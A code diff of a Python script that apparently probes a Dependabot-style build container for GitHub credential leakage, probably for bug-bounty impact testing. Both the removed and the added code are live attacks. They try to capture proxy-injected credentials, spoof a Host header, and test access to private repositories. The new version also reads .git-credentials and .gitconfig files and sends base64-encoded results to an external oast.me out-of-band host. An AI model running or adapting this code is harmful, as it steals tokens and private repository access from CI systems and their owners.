@@ -1,49 +1,59 @@
 import os
 import urllib.request
 import base64
-import json
+import subprocess
 
-# The proxy at 172.19.0.2:1080 might inject credentials
-# Try to make a github API call THROUGH the proxy and capture the auth
-proxy = os.environ.get('http_proxy', 'http://172.19.0.2:1080')
+# Test cross-repo git access - can we access repos beyond the current one?
+results = {}
 
-# Method 1: Make API call through proxy and report what user we are
+# Test 1: ls-remote on the SAME repo (should work - baseline)
 try:
-    req = urllib.request.Request('https://api.github.com/user')
-    response = urllib.request.urlopen(req, timeout=10)
-    user_data = response.read().decode()[:500]
-    b64 = base64.urlsafe_b64encode(user_data.encode()).decode()
-    urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/api-user?d=' + b64[:1800], timeout=5)
+    r = subprocess.run(['git', 'ls-remote', 'https://github.com/toofikz2/depbot-impact-test.git', 'HEAD'],
+                       capture_output=True, text=True, timeout=10)
+    results['same_repo'] = f'rc={r.returncode} out={r.stdout[:50]}'
 except Exception as e:
-    err = base64.urlsafe_b64encode(str(e)[:200].encode()).decode()
-    urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/api-err?e=' + err, timeout=5)
+    results['same_repo'] = f'err={str(e)[:50]}'
 
-# Method 2: Try to route a request to OUR server through the proxy
-# If the proxy blindly injects creds, we'll see them in the request
+# Test 2: ls-remote on PRIVATE repo in same org  
 try:
-    # Try to make the proxy think our OOB host is github.com
-    req2 = urllib.request.Request(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/proxy-test')
-    req2.add_header('Host', 'github.com')
-    urllib.request.urlopen(req2, timeout=5)
-except Exception:
-    pass
-
-# Method 3: Check what the proxy adds to github.com requests by cloning
-try:
-    import subprocess
-    # Run git ls-remote through the proxy to see if creds are injected
-    result = subprocess.run(
-        ['git', 'ls-remote', 'https://github.com/toofikz2/depbot-impact-test.git', 'HEAD'],
-        capture_output=True, text=True, timeout=10,
-        env={**os.environ, 'GIT_TRACE': '1', 'GIT_CURL_VERBOSE': '1'}
-    )
-    git_out = (result.stdout + result.stderr)[:1000]
-    b64_git = base64.urlsafe_b64encode(git_out.encode()).decode()
-    urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/git-trace?d=' + b64_git[:1800], timeout=5)
+    r = subprocess.run(['git', 'ls-remote', 'https://github.com/tooforg/private-test-repo.git', 'HEAD'],
+                       capture_output=True, text=True, timeout=10)
+    results['org_private'] = f'rc={r.returncode} out={r.stdout[:50]}'
 except Exception as e:
-    err = base64.urlsafe_b64encode(str(e)[:200].encode()).decode()
+    results['org_private'] = f'err={str(e)[:50]}'
+
+# Test 3: ls-remote on PERSONAL private repo (should NOT be accessible)
+try:
+    r = subprocess.run(['git', 'ls-remote', 'https://github.com/toofikz1/personal-secret-repo.git', 'HEAD'],
+                       capture_output=True, text=True, timeout=10)
+    results['personal_private'] = f'rc={r.returncode} out={r.stdout[:50]}'
+except Exception as e:
+    results['personal_private'] = f'err={str(e)[:50]}'
+
+# Test 4: Check git credential helper config
+try:
+    r = subprocess.run(['git', 'config', '--list'], capture_output=True, text=True, timeout=5)
+    results['git_config'] = r.stdout[:300]
+except Exception as e:
+    results['git_config'] = f'err={str(e)[:50]}'
+
+# Test 5: Check .gitconfig and credential files
+import pathlib
+for path in ['/home/dependabot/.gitconfig', '/home/dependabot/.git-credentials',
+             '/root/.gitconfig', '/root/.git-credentials']:
     try:
-        urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/git-err?e=' + err, timeout=5)
+        content = pathlib.Path(path).read_text()[:200]
+        results[f'file:{path}'] = content
+    except Exception as e:
+        results[f'file:{path}'] = f'err={str(e)[:30]}'
+
+# Exfil results
+import json
+payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
+chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 9000), 1800)]
+for i, chunk in enumerate(chunks):
+    try:
+        urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/crossrepo/{i}?d=' + chunk, timeout=5)
     except:
         pass
 
